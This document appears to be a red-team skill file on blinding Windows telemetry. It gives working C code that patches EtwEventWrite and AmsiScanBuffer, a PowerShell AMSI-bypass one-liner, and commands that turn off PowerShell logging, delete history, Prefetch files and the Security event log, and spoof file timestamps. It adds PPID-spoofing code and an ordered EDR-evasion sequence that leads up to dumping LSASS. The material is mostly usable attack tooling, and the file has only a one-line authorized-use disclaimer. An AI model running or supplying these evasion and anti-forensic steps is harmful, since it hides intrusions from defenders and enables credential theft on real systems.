# Telemetry Blinding: ETW/AMSI/Anti-Forensics

> Only for authorized red team/confrontation exercises/own product testing, prohibited for use on unauthorized targets.

EDR's detection capabilities rely heavily on the two telemetry pipelines ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface).
This document summarizes red team countermeasures for these two pipelines, supplemented by anti-forensic combinations such as Sysmon / PowerShell logging / timestamp spoof.

Compare MITER ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW internal structure

ETW is a high-performance event tracking framework built into Windows, which EDR uses for "lightweight kernel telemetry".
The provider the red team is most concerned about:

| Provider GUID | Name | Who is using it |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDR |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI reporting |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | Process/Thread Basic Events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading, JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR startup |

### Key user mode API

| API | DLL | Function |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | Write events (most commonly used) |
| `EtwEventWriteFull` | `ntdll.dll` | Event with activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | Extended version |
| `NtTraceEvent` | `ntdll.dll` | EtwEventWrite underlying |
| `NtTraceControl` | `ntdll.dll` | Control trace session (start/stop/query provider) |
| `EtwEventEnabled` | `ntdll.dll` | Whether provider is enabled |
| `EtwEventRegister` | `ntdll.dll` | Register provider |

### Call chain

```text
Application code EventWrite(...)
→ Microsoft package (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
→ nt!NtTraceEvent (kernel)
→ Kernel ETW core → Consumer side (EDR user mode process subscription session)
```

## 2. ETW Patch three methods

### Method A: EtwEventWrite head patch

Directly change the `ntdll!EtwEventWrite` entry to return success immediately:

```text
original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

After patch (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C code:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // Note: VirtualProtect itself may be hooked -> use the indirect syscall version
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC WARNING**: Writing to ntdll memory itself is a source of `ALPC_MODIFY_PROCESS` / `PROTECTVM` events monitored by ETW-TI.
You must **use indirect syscall + to bypass NtProtectVirtualMemory hook first and then patch**,
Otherwise, EDR has already received the alarm before the patch takes effect.

### Method B: EtwEventEnabled always-false

More subtle: don't modify `EtwEventWrite`, but let `EtwEventEnabled` always return FALSE,
The application layer will judge by itself that "the provider is not open" → not call `EtwEventWrite`, which is more friendly to the memory hash integrity check (many EDR checks `EtwEventWrite` bytes).

```c
// EtwEventEnabled usually returns BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: NtTraceControl off provider

Use syscall to directly close the EDR session (intrusive, but leave ntdll bytes unchanged):

```c
// NtTraceControl(EtwpStopTrace, ...)
// Requires SeSystemProfilePrivilege or higher
// Applies to Local Admin + UAC bypass
```

It is rarely used in actual combat because:

- Closing the session itself will trigger the "ETW provider stopped" event and be sensed by another pipeline
- Requires high permissions

### Method D: Kernel state ETW patch (only when there is BYOVD/kernel reading and writing)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
Set to 0 directly to cause all ETW-TI events to be discarded
```

It belongs to the BYOVD stage of attack-chain, and this skill does not go into depth.

## 3. AMSI Bypass

AMSI is an interface provided by Windows for PowerShell / .NET / WMI / VBA to do anti-virus scanning before executing scripts.
The one most commonly encountered by red teams is PowerShell + AMSI.

### Classic AmsiScanBuffer Patch

```c
// amsi.dll!AmsiScanBuffer entry write:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4 ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

PowerShell one-sentence version (only for reference detection confrontation, itself intercepted by signature/Defender):

```powershell
# Concept Demonstration - Real-world environments must accommodate obfuscation / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced Solution 1: Hardware Breakpoint AMSI Bypass

Leave amsi.dll memory untouched (integrity scan will not be triggered):

1. AddVectoredExceptionHandler
2. Set `DR0` in the `AmsiScanBuffer` entry
3. When VEH hits, set `RAX = 0x80070057`, `RIP = ret instruction address`, `RSP += 8`
4. ContinueExecution

The same infrastructure as HWBP Blindside of unhook-techniques.md can share VEH.

### Advanced solution 2: AmsiContext / AmsiSession damaged

Construct a malformed `AmsiContext` structure and let `AmsiScanBuffer` return success in advance due to verification failure:

```text
// The AmsiContext header should be the "AMSI" magic number
// Change to "XXXX" → AmsiScanBuffer internal verification fails but returns S_OK + AMSI_RESULT_CLEAN
```

### Advanced solution 3: Reflective loads a copy of amsi.dll

Instead of using the system amsi.dll, reflectively load a clean copy into your own process and redirect the PowerShell engine's calls to AMSI.
Suitable for advanced EDR that already intercepts PowerShell.exe startup during the loading phase.

## 4. Anti-forensics: clearing traces

### PowerShell ScriptBlock Logging turned off

```powershell
# Registration form (administrator required)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clear PowerShell history

```powershell
# current session
Clear-History
# Persistence history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clear Prefetch

```powershell
# Requires SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# Clear the whole (large movement, use with caution)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clear ETL log

```powershell
# Delete etl after stopping the session
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# Note: Deleting .evtx directly will be re-created by Event Log Service and write the "log cleared" event (Event ID 1102)
# More hidden: EventLog API of patch wevtsvc.dll in memory (belongs to T1070.001)
```

### Timestamp spoof (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Sysmon monitoring circumvention

Sysmon is the most common free telemetry in the community (many enterprises use olaf configuration).
Key events:

| Event ID | Meaning |
|----------|------|
| 1 | ProcessCreate (including PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL loading) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess（OpenProcess） |
| 11 | FileCreate |
| 12/13/14 | Registration Form |
| 22 | DNS Query |
| 25 | ProcessTampering（image hollowing） |

### Avoidance ideas

1. **Do not create new processes** — all actions within the injected process, avoiding Event ID 1
2. **PPID Spoof** — Use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set the PPID to `explorer.exe` to make Sysmon ProcessCreate look legitimate

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + unbacked image** — Process Hollowing has been captured by Event ID 25 in the new version of Sysmon.
It is preferred to use newer technologies such as **module stomping** (overwriting a section of a loaded legal DLL) or **dirty vanity**,
With PPID spoof
4. **Don’t remote thread** — avoid Event ID 8; use `NtCreateThreadEx` to execute / APC / Early Bird APC in own process
5. **DNS Go DoH/HTTPS** — Avoid Event ID 22

## 6. Call Stack Spoof + timestamp make events look like legitimate software

Even if ProcessCreate cannot be triggered (for example, some scenes must spawn children), you can:

- Change the CommandLine to a format similar to that of a legitimate software
- PPID spoof to services.exe (disguise SCM started services)
- Modify the Image hash seen by ImageLoad: put the implant code into a signed DLL memory space through module stomping
- With CallStackSpoofer: Sysmon cannot see the implant frame even if EnableCallTracing is turned on

## 7. Practical OPSEC: Operation sequence

**If the order is wrong, EDR will receive the alarm first**, causing subsequent actions to be directly blocked.

Correct order:

```text
1. AMSI bypass (HWBP takes priority, avoid writing amsi.dll)
─── Let .NET / PowerShell not be scanned when loading implants
2. ETW patch (patch EtwEventWrite first, then do any syscall)
─── Turn off telemetry of own subsequent actions
3. NtProtectVirtualMemory is called with indirect syscall
─── Prepare "safe" memory permission switching channels
4. Unhook ntdll (Peruns Fart) or enable indirect syscall
─── Erase user mode hook
5. Call stack spoof setup
─── Prepare the pseudo stack of all syscalls after preparation
6. Actual payload execution (injection / lateral / dump LSASS)
7. Clear traces (PowerShell history / Prefetch / timestamp)
```

Example of wrong order:

```text
❌ First unhook ntdll → ETW-TI immediately reports PROTECTVM + module modification → SOC has received the alarm
❌ Dump LSASS first → AMSI / ETW have not been compressed yet → High confidence T1003.001 alarm
✅ AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider：<https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching Overview: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass Encyclopedia: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf configuration: <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing：<https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask：<https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation：<https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging)：<https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking)：<https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal)：<https://attack.mitre.org/techniques/T1070/>

## Route callback

After completing this three-piece set (hook research → unhook → telemetry blinding), return to `SKILL.md` Step 5 to verify in the sandbox.
Then press the initial access and lateral movement chapters of `attack-chain/` to enter the next stage.
